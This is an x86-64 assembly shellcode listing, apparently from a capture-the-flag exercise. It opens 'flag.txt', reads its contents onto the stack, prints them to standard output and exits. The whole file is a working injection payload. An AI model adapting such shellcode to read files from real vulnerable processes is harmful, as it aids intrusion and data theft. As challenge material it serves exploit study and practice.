/* open("flag.txt",O_RDONLY); read(fd, buf, 0x100); write(1, buf, rax); exit(0) */
.intel_syntax noprefix
.global _start
_start:
    /* openat? simple open: rax=2, rdi=path, rsi=0 */
    lea rdi, [rip + path]
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall
    mov edi, eax              /* fd */
    sub rsp, 0x200
    lea rsi, [rsp]
    mov edx, 0x200
    xor eax, eax              /* read */
    syscall
    mov edx, eax              /* n */
    mov edi, 1
    lea rsi, [rsp]
    mov eax, 1                /* write */
    syscall
    xor edi, edi
    mov eax, 60               /* exit */
    syscall
path:
    .ascii "flag.txt\0"
